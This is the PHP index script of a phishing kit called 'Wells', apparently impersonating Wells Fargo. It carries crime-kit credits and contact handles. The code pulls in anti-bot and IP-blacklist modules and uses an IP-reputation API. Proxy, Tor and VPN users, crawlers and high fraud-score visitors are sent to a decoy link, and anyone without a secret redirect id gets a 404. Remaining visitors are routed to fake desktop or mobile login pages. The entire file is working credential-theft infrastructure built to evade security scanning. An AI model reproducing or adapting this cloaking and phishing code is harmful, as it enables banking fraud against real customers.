<?php
session_start();

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Wells -
 * version 1.0
 * Re-Loaded By Groot
 * icq+teleg = @iam_groot
 
###############################################
#$            C0d3d by Spoxcoder             $#
###############################################

**/

include'Spox/config.php';
include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';
@require "Spox/Anti/Crawler/src/CrawlerDetect.php";

use JayBizzle\CrawlerDetect\CrawlerDetect;

$WELLS_SESSION_SPOX = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));

$uaFull = strtolower($_SERVER['HTTP_USER_AGENT']);
		$uaStart = substr($uaFull, 0, 4);

		$uaPhone = [ // use `= array(` if PHP<5.4
		'(android|bb\d+|meego).+mobile','avantgo','bada\/','blackberry','blazer','compal','elaine','fennec','hiptop','iemobile','ip(hone|od)','iris','kindle','lge ','maemo','midp','mmp','mobile.+firefox','netfront','opera m(ob|in)i','palm( os)?','phone','p(ixi|re)\/','plucker','pocket','psp','series(4|6)0','symbian','treo','up\.(browser|link)','vodafone','wap','windows ce','xda','xiino'
		]; // use `);` if PHP<5.4

		$uaMobile = [ // use `= array(` if PHP<5.4
		'1207','6310','6590','3gso','4thp','50[1-6]i','770s','802s','a wa','abac|ac(er|oo|s\-)','ai(ko|rn)','al(av|ca|co)','amoi','an(ex|ny|yw)','aptu','ar(ch|go)','as(te|us)','attw','au(di|\-m|r |s )','avan','be(ck|ll|nq)','bi(lb|rd)','bl(ac|az)','br(e|v)w','bumb','bw\-(n|u)','c55\/','capi','ccwa','cdm\-','cell','chtm','cldc','cmd\-','co(mp|nd)','craw','da(it|ll|ng)','dbte','dc\-s','devi','dica','dmob','do(c|p)o','ds(12|\-d)','el(49|ai)','em(l2|ul)','er(ic|k0)','esl8','ez([4-7]0|os|wa|ze)','fetc','fly(\-|_)','g1 u','g560','gene','gf\-5','g\-mo','go(\.w|od)','gr(ad|un)','haie','hcit','hd\-(m|p|t)','hei\-','hi(pt|ta)','hp( i|ip)','hs\-c','ht(c(\-| |_|a|g|p|s|t)|tp)','hu(aw|tc)','i\-(20|go|ma)','i230','iac( |\-|\/)','ibro','idea','ig01','ikom','im1k','inno','ipaq','iris','ja(t|v)a','jbro','jemu','jigs','kddi','keji','kgt( |\/)','klon','kpt ','kwc\-','kyo(c|k)','le(no|xi)','lg( g|\/(k|l|u)|50|54|\-[a-w])','libw','lynx','m1\-w','m3ga','m50\/','ma(te|ui|xo)','mc(01|21|ca)','m\-cr','me(rc|ri)','mi(o8|oa|ts)','mmef','mo(01|02|bi|de|do|t(\-| |o|v)|zz)','mt(50|p1|v )','mwbp','mywa','n10[0-2]','n20[2-3]','n30(0|2)','n50(0|2|5)','n7(0(0|1)|10)','ne((c|m)\-|on|tf|wf|wg|wt)','nok(6|i)','nzph','o2im','op(ti|wv)','oran','owg1','p800','pan(a|d|t)','pdxg','pg(13|\-([1-8]|c))','phil','pire','pl(ay|uc)','pn\-2','po(ck|rt|se)','prox','psio','pt\-g','qa\-a','qc(07|12|21|32|60|\-[2-7]|i\-)','qtek','r380','r600','raks','rim9','ro(ve|zo)','s55\/','sa(ge|ma|mm|ms|ny|va)','sc(01|h\-|oo|p\-)','sdk\/','se(c(\-|0|1)|47|mc|nd|ri)','sgh\-','shar','sie(\-|m)','sk\-0','sl(45|id)','sm(al|ar|b3|it|t5)','so(ft|ny)','sp(01|h\-|v\-|v )','sy(01|mb)','t2(18|50)','t6(00|10|18)','ta(gt|lk)','tcl\-','tdg\-','tel(i|m)','tim\-','t\-mo','to(pl|sh)','ts(70|m\-|m3|m5)','tx\-9','up(\.b|g1|si)','utst','v400','v750','veri','vi(rg|te)','vk(40|5[0-3]|\-v)','vm40','voda','vulc','vx(52|53|60|61|70|80|81|83|85|98)','w3c(\-| )','webc','whit','wi(g |nc|nw)','wmlb','wonu','x700','yas\-','your','zeto','zte\-'
		]; // use `);` if PHP<5.4

		$isPhone = preg_match('/' . implode($uaPhone, '|') . '/i', $uaFull);
		$isMobile = preg_match('/' . implode($uaMobile, '|') . '/i', $uaStart);
		$key = substr(sha1(mt_rand()),1,25);


 if ($redirection=="yes") {
	if (isset($_GET['id'])) {
	 $id = isset($_GET['id']) ? trim(htmlentities($_GET['id'])):'';
	  if ($id !== $redirect) {
	  	header("HTTP/1.0 404 Not Found");
		exit();
	  }
	}else{
		header("HTTP/1.0 404 Not Found");
		exit();
	}
  }


if ($api_protection=="yes") {

		$ch=curl_init();
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://www.ipqualityscore.com/api/json/ip/".$Key."/".$_SESSION['ip']."");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);

				$proxy = trim(strip_tags(get_string_between($json,'"proxy":',',"')));
				$tor = trim(strip_tags(get_string_between($json,'"tor":',',"')));
				$vpn = trim(strip_tags(get_string_between($json,'vpn":',',"')));
				$is_crawler = trim(strip_tags(get_string_between($json,'is_crawler":',',"')));
				$fraud_score = trim(strip_tags(get_string_between($json,'fraud_score":',',"')));
				$success = trim(strip_tags(get_string_between($json,'success":',',"')));

			if ($anti_proxy=="yes") { if ($proxy == "true") {
				exit(header("Location: https://bit.ly/2UgDDbr"));
				}
			} 

			if ($anti_tor=="yes") { if ($tor == "true") {
				exit(header("Location: https://bit.ly/2UgDDbr"));
				}
			}

			if ($anti_vpn=="yes") { if ($vpn == "true") {
				exit(header("Location: https://bit.ly/2UgDDbr"));
				}
			}

			if ($anti_web_crawler=="yes") { if ($is_crawler == "true") {
				exit(header("Location: https://bit.ly/2UgDDbr"));
				}
			}

			if ($fraud_score >= "".$max_fraud_score."") {
				exit(header("Location: https://bit.ly/2UgDDbr"));
			}

			if ($success == "false") {
				echo "<br><br><br><h3><center><h3 style='color:red'>YOUR API PROTECTION IS DEAD</h3> Please Contact Owner < Dila Belmili > On <a href='https://fb.com/hackeeeed.htmI' target='_blanc'> FACEBOOK</></center></h3>";
				}

			if($isPhone || $isMobile) {
				
			   $_SESSION['WELLS_SPOX'] = $WELLS_SESSION_SPOX;
			   exit(header("Location: loginmobile?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));

			} else {
			   $_SESSION['WELLS_SPOX'] = $WELLS_SESSION_SPOX;
			   exit(header("Location: login?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
			} 

	}else{

		
		if($isPhone || $isMobile) {
			   $_SESSION['WELLS_SPOX'] = $WELLS_SESSION_SPOX;
			   exit(header("Location: loginmobile?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));

			} else {
			   $_SESSION['WELLS_SPOX'] = $WELLS_SESSION_SPOX;
			   exit(header("Location: login?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
			} 
}
?>